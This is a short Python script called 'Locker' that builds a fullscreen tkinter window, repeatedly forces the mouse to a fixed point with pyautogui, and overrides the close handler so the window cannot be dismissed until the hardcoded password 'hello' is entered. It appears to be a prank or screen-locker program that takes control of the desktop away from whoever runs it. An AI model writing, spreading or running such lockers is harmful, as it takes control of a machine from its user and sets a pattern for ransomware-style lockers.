from tkinter import Tk, Entry, Label
import pyautogui
import time


def on_key_press(event):
    global k, entry
    if entry.get() == "hello":
        k = True


def on_closing():
    pyautogui.click(675, 420)
    pyautogui.moveTo(675, 420)
    root.attributes("-fullscreen", True)
    root.protocol("WM_DELETE_WINDOW", on_closing)
    root.update()
    root.bind('<Control-KeyPress-c>', on_key_press)

root = Tk()
root.title("Locker")
root.attributes("-fullscreen", True)

entry = Entry(root, font = 1)
entry.place(width = 150, height = 50, x = 600, y = 400)

label0 = Label(root, text = "Locker_by_#571", font = 1)
label0.grid(row = 0, column = 0)

label1 = Label(root, text = "Write the password and press Ctrl+C", font = 'Arial 20')
label1.place(x = 470, y = 300)

root.update()
time.sleep(0.2)

pyautogui.click(675, 420)
k = False

while not k: #k != True:
    on_closing()
